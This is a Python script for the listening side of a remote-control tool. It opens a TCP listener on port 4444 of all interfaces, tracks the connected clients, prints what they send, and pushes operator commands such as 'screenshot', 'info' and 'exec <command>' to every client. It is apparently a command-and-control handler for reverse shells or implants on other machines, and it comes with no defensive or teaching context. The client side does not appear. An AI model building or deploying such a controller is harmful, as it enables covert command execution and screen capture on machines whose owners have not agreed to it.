import socket
import threading

# --- EDIT THIS SECTION ---
HOST = '0.0.0.0'  # Listen on all available network interfaces
PORT = 4444        # The port you want to listen on. Choose something > 1024.
# -------------------------

clients = []

def handle_client(client_socket, addr):
    print(f"[+] Accepted connection from {addr[0]}:{addr[1]}")
    clients.append(client_socket)
    
    while True:
        try:
            # Receive data from the client
            data = client_socket.recv(4096)
            if not data:
                break
            
            # Decode and print the received data
            print(f"\n[Received from {addr[0]}]:\n{data.decode('utf-8', errors='ignore')}")
            
            # Prompt for the next command
            print("\nEnter command to send: ", end="", flush=True)

        except ConnectionResetError:
            break

    print(f"[-] {addr[0]}:{addr[1]} disconnected.")
    clients.remove(client_socket)
    client_socket.close()

def start_listener():
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((HOST, PORT))
    server.listen(5)
    print(f"[*] Listening on {HOST}:{PORT}")

    while True:
        client_socket, addr = server.accept()
        client_handler = threading.Thread(target=handle_client, args=(client_socket, addr))
        client_handler.start()

def send_command(command):
    if clients:
        for client in clients:
            try:
                client.send(command.encode('utf-8'))
                print(f"[*] Command sent to all clients.")
            except:
                print("[-] Failed to send command to a client.")
    else:
        print("[-] No clients connected.")

if __name__ == "__main__":
    # Start the listener in a separate thread
    listener_thread = threading.Thread(target=start_listener)
    listener_thread.daemon = True
    listener_thread.start()

    print("Listener started. Type 'help' for commands.")
    while True:
        cmd = input("Enter command to send: ")
        if cmd.lower() == 'help':
            print("Commands: 'screenshot', 'info', 'exec <command>', 'exit'")
        elif cmd.lower() == 'exit':
            break
        else:
            send_command(cmd)
